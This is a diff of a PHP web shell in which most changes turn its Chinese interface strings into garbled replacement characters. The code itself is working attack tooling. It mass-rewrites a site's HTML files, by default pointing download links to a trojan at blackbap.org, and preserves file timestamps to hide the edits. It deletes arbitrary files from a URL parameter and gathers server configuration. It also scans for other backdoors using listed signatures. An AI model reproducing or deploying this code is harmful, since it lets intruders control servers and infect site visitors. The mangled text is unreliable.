-Ä¿Â¼({$NUM_D}) / ÎÄ¼þ({$NUM_F})</div> </form> 
+<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined">
+<input type="hidden" id="inver" name="inver" value="undefined">
+<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);">
+<input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="SubmitUrl('ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¡ï¿½Ä¼ï¿½ï¿½ï¿½Â·ï¿½ï¿½: ','{$THIS_DIR}','a');return false;">
+<input type="button" value="É¾ï¿½ï¿½" onclick="Delok('ï¿½ï¿½Ñ¡ï¿½Ä¼ï¿½','b');return false;">
+<input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="SubmitUrl('ï¿½Þ¸ï¿½ï¿½ï¿½Ñ¡ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ÖµÎª: ','0666','c');return false;">
+<input type="button" value="Ê±ï¿½ï¿½" onclick="CheckDate('{$Filetime}','d');return false;">
+<input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="SubmitUrl('ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¡ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îª: ','silic.gz','e');return false;">
+Ä¿Â¼({$NUM_D}) / ï¿½Ä¼ï¿½({$NUM_F})</div> </form>
 END;
 return true;
 }
-//ÅúÁ¿Ìæ»»
+//ï¿½ï¿½ï¿½ï¿½ï¿½æ»»
 function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb)
 {
 	if(($h_d = @opendir($tp)) == NULL) return false;
@@ -513,7 +513,7 @@ function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb)
 				for($i = 0;$i < count($nc[1]);$i++){if(eregi($tca,$nc[1][$i])){$ic = str_replace($nc[1][$i],$tcb,$ic);$doing = true;}}
 			}
 			if($td) $ftime = @filemtime($Filepath);
-			if($doing) echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">³É¹¦:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">Ê§°Ü:</font>'.$Filepath.' <br>'."\r\n";
+			if($doing) echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">ï¿½É¹ï¿½:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">Ê§ï¿½ï¿½:</font>'.$Filepath.' <br>'."\r\n";
 			if($td) @touch($Filepath,$ftime);
 			ob_flush();
 			flush();
@@ -532,7 +532,7 @@ function Tihuan_d()
 		$tb = ($_POST['tb'] == 'a') ? true : false;
 		$th = ($_POST['th'] == 'a') ? true : false;
 		if($th) $_POST['tca'] = str_replace('.','\\.',$_POST['tca']);
-		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">Ìæ»»Íê±Ï</a>' : '<a href="#" onclick="window.location=\'?s=d\'">Òì³£ÖÕÖ¹</a>';
+		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">ï¿½æ»»ï¿½ï¿½ï¿½ï¿½</a>' : '<a href="#" onclick="window.location=\'?s=d\'">ï¿½ì³£ï¿½ï¿½Ö¹</a>';
 		echo '</div>';
 		return false;
 	}
@@ -548,42 +548,42 @@ function Fulllll(i){
   return true;
 }
 function showth(th){
-	if(th == 'a') document.getElementById('setauto').innerHTML = '²éÕÒÄÚÈÝ:<textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Ìæ»»³ÉÎª:<textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
-	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>ÏÂÔØºó×º <input type="text" name="tca" id="tca" value=".exe|.7z|.rar|.zip|.gz|.txt" style="width:500px;"><br><br>Ìæ»»³ÉÎª <input type="text" name="tcb" id="tcb" value="http://blackbap.org/muma.exe" style="width:500px;">';
+	if(th == 'a') document.getElementById('setauto').innerHTML = 'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:<textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>ï¿½æ»»ï¿½ï¿½Îª:<textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
+	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>ï¿½ï¿½ï¿½Øºï¿½×º <input type="text" name="tca" id="tca" value=".exe|.7z|.rar|.zip|.gz|.txt" style="width:500px;"><br><br>ï¿½æ»»ï¿½ï¿½Îª <input type="text" name="tcb" id="tcb" value="http://blackbap.org/muma.exe" style="width:500px;">';
 	return true;
 }
 function autoup(){
-	if(document.getElementById('tp').value == ''){alert('Â·¾¶²»ÄÜÎª¿Õ');return false;}
-	if(document.getElementById('tt').value == ''){alert('ÀàÐÍ²»ÄÜÎª¿Õ');return false;}
-	if(document.getElementById('tca').value == ''){alert('´úÂë²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('tp').value == ''){alert('Â·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îªï¿½ï¿½');return false;}
+	if(document.getElementById('tt').value == ''){alert('ï¿½ï¿½ï¿½Í²ï¿½ï¿½ï¿½Îªï¿½ï¿½');return false;}
+	if(document.getElementById('tca').value == ''){alert('ï¿½ï¿½ï¿½ë²»ï¿½ï¿½Îªï¿½ï¿½');return false;}
 	document.getElementById('tform').submit();
 }
 </script>
 <form method="POST" name="tform" id="tform" action="?s=d">
-<div class="actall" style="height:35px;">Ìæ»»Â·¾¶ <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">ï¿½æ»»Â·ï¿½ï¿½ <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fulllll(options[selectedIndex].value)'>
-<option value="0" selected>--·¶Î§Ñ¡Ôñ--</option>
-<option value="1">ÍøÕ¾¸ùÄ¿Â¼</option>
-<option value="2">±¾³ÌÐòÄ¿Â¼</option>
+<option value="0" selected>--ï¿½ï¿½Î§Ñ¡ï¿½ï¿½--</option>
+<option value="1">ï¿½ï¿½Õ¾ï¿½ï¿½Ä¿Â¼</option>
+<option value="2">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼</option>
 </select></div>
-<div class="actall" style="height:35px;">ÎÄ¼þÀàÐÍ <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fulllll(options[selectedIndex].value)'>
-<option value="0" selected>--ÀàÐÍÑ¡Ôñ--</option>
-<option value="3">¾²Ì¬ÎÄ¼þ</option>
-<option value="4">½Å±¾+¾²Ì¬</option>
-<option value="5">JSÎÄ¼þ</option>
+<option value="0" selected>--ï¿½ï¿½ï¿½ï¿½Ñ¡ï¿½ï¿½--</option>
+<option value="3">ï¿½ï¿½Ì¬ï¿½Ä¼ï¿½</option>
+<option value="4">ï¿½Å±ï¿½+ï¿½ï¿½Ì¬</option>
+<option value="5">JSï¿½Ä¼ï¿½</option>
 </select></div>
-<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>Ìæ»»ÎÄ¼þÖÐµÄÖ¸¶¨ÄÚÈÝ <input type="radio" name="th" value="b" onclick="showth('b')">Ìæ»»ÎÄ¼þÖÐµÄÏÂÔØµØÖ·<br>
-<div id="setauto">²éÕÒÄÚÈÝ <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Ìæ»»³ÉÎª <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>±£³ÖÎÄ¼þÐÞ¸ÄÊ±¼ä²»±ä</div>
-<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>½«Ìæ»»Ó¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð,×ÓÎÄ¼þ¼ÐºÍÎÄ¼þ
-<br><input type="radio" name="tb" value="b">½ö½«Ìæ»»Ó¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð</div>
-<div class="actall"><input type="button" value="¿ªÊ¼Ìæ»»" style="width:80px;height:26px;" onclick="autoup();"></div>
+<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>ï¿½æ»»ï¿½Ä¼ï¿½ï¿½Ðµï¿½Ö¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ <input type="radio" name="th" value="b" onclick="showth('b')">ï¿½æ»»ï¿½Ä¼ï¿½ï¿½Ðµï¿½ï¿½ï¿½ï¿½Øµï¿½Ö·<br>
+<div id="setauto">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>ï¿½æ»»ï¿½ï¿½Îª <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Þ¸ï¿½Ê±ï¿½ä²»ï¿½ï¿½</div>
+<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>ï¿½ï¿½ï¿½æ»»Ó¦ï¿½ï¿½ï¿½Ú¸ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ðºï¿½ï¿½Ä¼ï¿½
+<br><input type="radio" name="tb" value="b">ï¿½ï¿½ï¿½ï¿½ï¿½æ»»Ó¦ï¿½ï¿½ï¿½Ú¸ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½</div>
+<div class="actall"><input type="button" value="ï¿½ï¿½Ê¼ï¿½æ»»" style="width:80px;height:26px;" onclick="autoup();"></div>
 </form>
 END;
 return true;
 }
-//É¨ÃèÄ¾Âí
+//É¨ï¿½ï¿½Ä¾ï¿½ï¿½
 function Antivirus_Auto($sp,$features,$st,$sb)
 {
 	if(($h_d = @opendir($sp)) == NULL) return false;
@@ -603,8 +603,8 @@ function Antivirus_Auto($sp,$features,$st,$sb)
 				{
 					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
 					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
-					echo ' <a href="'.$Fileurls.'" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> ¡¾<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank"> ±à¼­ </a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank"> É¾³ý </a> ¡¿ ';
-					echo ' ¡¾ '.$Filetime.' ¡¿ <font color="#FF0000"> '.$var.' </font> <br> <br> '."\r\n";
+					echo ' <a href="'.$Fileurls.'" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> ï¿½ï¿½<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank"> ï¿½à¼­ </a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank"> É¾ï¿½ï¿½ </a> ï¿½ï¿½ ';
+					echo ' ï¿½ï¿½ '.$Filetime.' ï¿½ï¿½ <font color="#FF0000"> '.$var.' </font> <br> <br> '."\r\n";
 					break;
 				}
 			}
@@ -618,19 +618,19 @@ function Antivirus_Auto($sp,$features,$st,$sb)
 
 function Antivirus_e()
 {
-	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'É¾³ý³É¹¦';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'É¾³ý³É¹¦' : 'É¾³ýÊ§°Ü';} return false;}
+	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'É¾ï¿½ï¿½ï¿½É¹ï¿½';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'É¾ï¿½ï¿½ï¿½É¹ï¿½' : 'É¾ï¿½ï¿½Ê§ï¿½ï¿½';} return false;}
 	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
 	$SCAN_DIR = isset($_POST['sp']) ? $_POST['sp'] : File_Mode();
-	$features_php = array('evalÒ»¾ä»°ÌØÕ÷'=>'eval(','´óÂíreadÌØÕ÷'=>'->read()','´óÂíreaddirÌØÕ÷3'=>'readdir(','MYSQL×Ô¶¨Òåº¯ÊýÓï¾ä'=>'returns string soname','¼ÓÃÜÌØÕ÷1'=>'eval(gzinflate(','¼ÓÃÜÌØÕ÷2'=>'eval(base64_decode(','¼ÓÃÜÌØÕ÷3'=>'base64_decode(','evalÒ»¾ä»°2'=>'eval (','php¸´ÖÆÌØÕ÷'=>'copy($_FILES','¸´ÖÆÌØÕ÷2'=>'copy ($_FILES','ÉÏ´«ÌØÕ÷'=>'move_uploaded_file($_FILES','ÉÏ´«ÌØÕ÷2'=>'move_uploaded_file ($_FILES','Ð¡ÂíÌØÕ÷'=>'str_replace(\'\\\\\',\'/\',');
-	$features_asx = array('½Å±¾¼ÓÃÜ'=>'VBScript.Encode','¼ÓÃÜÌØÕ÷'=>'#@~^','fso×é¼þ'=>'fso.createtextfile(path,true)','excuteÒ»¾ä»°'=>'execute','evalÒ»¾ä»°'=>'eval','wscriptÌØÕ÷'=>'F935DC22-1CF0-11D0-ADB9-00C04FD58A0B','Êý¾Ý¿â²Ù×÷ÌØÕ÷'=>'13709620-C279-11CE-A49E-444553540000','wscriptÌØÕ÷'=>'WScript.Shell','fsoÌØÕ÷'=>'0D43FE01-F093-11CF-8940-00A0C9054228','Ê®Èýº¯Êý'=>'©ï©å','aspx´óÂíÌØÕ÷'=>'Process.GetProcesses','aspxÒ»¾ä»°'=>'Request.BinaryRead');
+	$features_php = array('evalÒ»ï¿½ä»°ï¿½ï¿½ï¿½ï¿½'=>'eval(','ï¿½ï¿½ï¿½ï¿½readï¿½ï¿½ï¿½ï¿½'=>'->read()','ï¿½ï¿½ï¿½ï¿½readdirï¿½ï¿½ï¿½ï¿½3'=>'readdir(','MYSQLï¿½Ô¶ï¿½ï¿½åº¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'returns string soname','ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½1'=>'eval(gzinflate(','ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½2'=>'eval(base64_decode(','ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½3'=>'base64_decode(','evalÒ»ï¿½ä»°2'=>'eval (','phpï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'copy($_FILES','ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½2'=>'copy ($_FILES','ï¿½Ï´ï¿½ï¿½ï¿½ï¿½ï¿½'=>'move_uploaded_file($_FILES','ï¿½Ï´ï¿½ï¿½ï¿½ï¿½ï¿½2'=>'move_uploaded_file ($_FILES','Ð¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'str_replace(\'\\\\\',\'/\',');
+	$features_asx = array('ï¿½Å±ï¿½ï¿½ï¿½ï¿½ï¿½'=>'VBScript.Encode','ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'#@~^','fsoï¿½ï¿½ï¿½ï¿½'=>'fso.createtextfile(path,true)','excuteÒ»ï¿½ä»°'=>'execute','evalÒ»ï¿½ä»°'=>'eval','wscriptï¿½ï¿½ï¿½ï¿½'=>'F935DC22-1CF0-11D0-ADB9-00C04FD58A0B','ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'13709620-C279-11CE-A49E-444553540000','wscriptï¿½ï¿½ï¿½ï¿½'=>'WScript.Shell','fsoï¿½ï¿½ï¿½ï¿½'=>'0D43FE01-F093-11CF-8940-00A0C9054228','Ê®ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'ï¿½ï¿½ï¿½ï¿½','aspxï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'=>'Process.GetProcesses','aspxÒ»ï¿½ä»°'=>'Request.BinaryRead');
 print<<<END
 <form method="POST" name="tform" id="tform" action="?s=e">
-<div class="actall">É¨ÃèÂ·¾¶ <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
-<div class="actall">Ä¾ÂíÀàÐÍ <input type="checkbox" name="stphp" value="php" checked>phpÄ¾Âí 
-<input type="checkbox" name="stasx" value="asx">asp+aspxÄ¾Âí</div>
-<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>½«É¨ÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð,×ÓÎÄ¼þ¼ÐºÍÎÄ¼þ
-<br><input type="radio" name="sb" value="b">½ö½«É¨ÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð</div>
-<div class="actall"><input type="submit" value="¿ªÊ¼É¨Ãè" style="width:80px;"></div>
+<div class="actall">É¨ï¿½ï¿½Â·ï¿½ï¿½ <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
+<div class="actall">Ä¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ <input type="checkbox" name="stphp" value="php" checked>phpÄ¾ï¿½ï¿½
+<input type="checkbox" name="stasx" value="asx">asp+aspxÄ¾ï¿½ï¿½</div>
+<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>ï¿½ï¿½É¨ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½Ú¸ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ðºï¿½ï¿½Ä¼ï¿½
+<br><input type="radio" name="sb" value="b">ï¿½ï¿½ï¿½ï¿½É¨ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½Ú¸ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½</div>
+<div class="actall"><input type="submit" value="ï¿½ï¿½Ê¼É¨ï¿½ï¿½" style="width:80px;"></div>
 </form>
 END;
 if(!empty($_POST['sp']))
@@ -640,12 +640,12 @@ if(!empty($_POST['sp']))
 	if(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
 	if(isset($_POST['stphp']) && isset($_POST['stasx'])){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
 	$sb = ($_POST['sb'] == 'a') ? true : false;
-	echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? 'É¨ÃèÍê±Ï' :  'Òì³£ÖÕÖ¹';
+	echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? 'É¨ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½' :  'ï¿½ì³£ï¿½ï¿½Ö¹';
 	echo '</div>';
 }
 return true;
 }
-//ËÑË÷ÎÄ¼þ
+//ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
 function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
 {
 	//echo $sfp.'<br>'.$sfc.'<br>'.$sft.'<br>'.$sff.'<br>'.$sfb;
@@ -681,21 +681,21 @@ function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
 }
 function Findfile_j()
 {
-	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'É¾³ý³É¹¦';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'É¾³ý³É¹¦' : 'É¾³ýÊ§°Ü';} return false;}
+	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'É¾ï¿½ï¿½ï¿½É¹ï¿½';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'É¾ï¿½ï¿½ï¿½É¹ï¿½' : 'É¾ï¿½ï¿½Ê§ï¿½ï¿½';} return false;}
 	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
 	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();
 	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
 	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip|.pdf|.dll|.exe|.txt|.inf|.ppt|.xls|.js';
 print<<<END
 <form method="POST" name="jform" id="jform" action="?s=j">
-<div class="actall">É¨ÃèÂ·¾¶ <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
-<div class="actall">¹ýÂËÎÄ¼þ <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
-<div class="actall">¹Ø¼ü×Ö´® <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
-<input type="radio" name="sff" value="a" checked>ËÑË÷ÎÄ¼þÃû 
-<input type="radio" name="sff" value="b">ËÑË÷°üº¬ÎÄ×Ö</div>
-<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>½«ËÑË÷Ó¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð,×ÓÎÄ¼þ¼ÐºÍÎÄ¼þ
-<br><input type="radio" name="sfb" value="b">½ö½«ËÑË÷Ó¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð</div>
-<div class="actall"><input type="submit" value="¿ªÊ¼É¨Ãè" style="width:80px;"></div>
+<div class="actall">É¨ï¿½ï¿½Â·ï¿½ï¿½ <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
+<div class="actall">ï¿½Ø¼ï¿½ï¿½Ö´ï¿½ <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
+<input type="radio" name="sff" value="a" checked>ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½
+<input type="radio" name="sff" value="b">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</div>
+<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½Ú¸ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ðºï¿½ï¿½Ä¼ï¿½
+<br><input type="radio" name="sfb" value="b">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½Ú¸ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½</div>
+<div class="actall"><input type="submit" value="ï¿½ï¿½Ê¼É¨ï¿½ï¿½" style="width:80px;"></div>
 </form>
 END;
 	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
@@ -704,12 +704,12 @@ END;
 		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
 		$sff = ($_POST['sff'] == 'a') ? true : false;
 		$sfb = ($_POST['sfb'] == 'a') ? true : false;
-		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? 'ËÑË÷Íê±Ï' : 'Òì³£ÖÕÖ¹';
+		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? 'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½' : 'ï¿½ì³£ï¿½ï¿½Ö¹';
 		echo '</div>';
 	}
 	return true;
 }
-//ÏµÍ³ÐÅÏ¢
+//ÏµÍ³ï¿½ï¿½Ï¢
 function Info_Cfg($varname){
 switch($result = get_cfg_var($varname)){
 	case 0:return "No";break;
@@ -719,7 +719,7 @@ function Info_Fun($funName){return(false !==function_exists($funName)) ? "Yes" :
 function Info_f()
 {
 $dis_func = get_cfg_var("disable_functions");
-$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "²»ÔÊÐíÉÏ´«";
+$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï´ï¿½";
 $adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
 if($dis_func == ""){$dis_func = "No";}
 else{
@@ -728,55 +728,55 @@ else{
 }
 $phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
 $info = array(
-array("·þÎñÆ÷Ê±¼ä/±±¾©Ê±¼ä",date("YÄêmÔÂdÈÕ h:i:s",time())."&nbsp;/&nbsp;".gmdate("YÄênÔÂjÈÕ H:i:s",time()+8*3600)),
-array("·þÎñÆ÷ÓòÃû:¶Ë¿Ú(ip)","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>:".$_SERVER['SERVER_PORT']." ( ".gethostbyname($_SERVER['SERVER_NAME'])." )"),
-array("·þÎñÆ÷²Ù×÷ÏµÍ³(ÎÄ×Ö±àÂë)",PHP_OS." (".$_SERVER['HTTP_ACCEPT_LANGUAGE'].")"),
-array("·þÎñÆ÷½âÒëÒýÇæ",$_SERVER['SERVER_SOFTWARE']),
-array("ÄãµÄIP",getenv('REMOTE_ADDR')),
-array("PHPÔËÐÐ·½Ê½(°æ±¾)",strtoupper(php_sapi_name())."(".PHP_VERSION.") / °²È«Ä£Ê½:".Info_Cfg("safemode")),
-array("·þÎñÆ÷¹ÜÀíÔ±",$adminmail),
-array("±¾ÎÄ¼þÂ·¾¶",__FILE__),
-array("ÔÊÐíÊ¹ÓÃURL´ò¿ªÎÄ¼þ[allow_url_fopen]",Info_Cfg("allow_url_fopen")),
-array("ÔÊÐí¶¯Ì¬¼ÓÔØÁ´½Ó¿â[enable_dl]",Info_Cfg("enable_dl")),
-array("ÏÔÊ¾´íÎóÐÅÏ¢[display_errors]",Info_Cfg("display_errors")),
-array("×Ô¶¨ÒåÈ«¾Ö±äÁ¿[register_globals]",Info_Cfg("register_globals")),
-array("×Ô¶¯×Ö·û´®×ªÒå[magic_quotes_gpc]",Info_Cfg("magic_quotes_gpc")),
-array("×î¶àÄÚ´æÊ¹ÓÃÁ¿[memory_limit]",Info_Cfg("memory_limit")),
-array("POST×î´ó×Ö½Ú[post_max_size]",Info_Cfg("post_max_size")),
-array("ÔÊÐí×î´óÉÏ´«[upload_max_filesize]",$upsize),
-array("³ÌÐò×î³¤ÔËÐÐÊ±¼ä[max_execution_time]",Info_Cfg("max_execution_time")."Ãë"),
-array("½ûÓÃº¯Êý[disable_functions]",$dis_func),
-array("³ÌÐòÐÅÏ¢º¯Êý[phpinfo()]",$phpinfo),
-array("Ä¿Ç°»¹ÓÐ¿ÕÓà¿Õ¼ädiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
-array("GZÑ¹ËõÎÄ¼þÖ§³Ö[zlib]",Info_Fun("gzclose")),
-array("ZIPÑ¹ËõÎÄ¼þÖ§³Ö[ZipArchive(php_zip)]",Info_Fun("zip_open")),
-array("IMAPµç×ÓÓÊ¼þÏµÍ³",Info_Fun("imap_close")),
-array("XML½âÎö",Info_Fun("xml_set_object")),
-array("FTPµÇÂ½",Info_Fun("ftp_login")),
-array("SessionÖ§³Ö",Info_Fun("session_start")),
-array("SocketÖ§³Ö",Info_Fun("fsockopen")),
-array("MySQLÊý¾Ý¿â",Info_Fun("mysql_close")),
-array("MSSQLÊý¾Ý¿â",Info_Fun("mssql_close")),
-array("Postgre SQLÊý¾Ý¿â",Info_Fun("pg_close")),
-array("SQLiteÊý¾Ý¿â",Info_Fun("sqlite_close")),
-array("OracleÊý¾Ý¿â",Info_Fun("ora_close")),
-array("Oracle 8Êý¾Ý¿â",Info_Fun("OCILogOff")),
-array("SyBaseÊý¾Ý¿â",Info_Fun("sybase_close")),
-array("HyperwaveÊý¾Ý¿â",Info_Fun("hw_close")),
-array("InforMixÊý¾Ý¿â",Info_Fun("ifx_close")),
-array("FileProÊý¾Ý¿â",Info_Fun("filepro_fieldcount")),
-array("DBA/DBMÁ¬½Ó",Info_Fun("dba_close")."&nbsp;/&nbsp;".Info_Fun("dbmclose")),
-array("ODBC/dBASEÁ¬½Ó",Info_Fun("odbc_close")."&nbsp;/&nbsp;".Info_Fun("dbase_close")),
-array("PRELÏàÈÝÓï·¨[PCRE]",Info_Fun("preg_match")),
-array("PDFÖ§³Ö",Info_Fun("pdf_close")),
-array("Í¼ÐÎ´¦Àí[GD Library]",Info_Fun("imageline")),
-array("SNMPÍøÂç¹ÜÀíÐ­Òé",Info_Fun("snmpget")),);
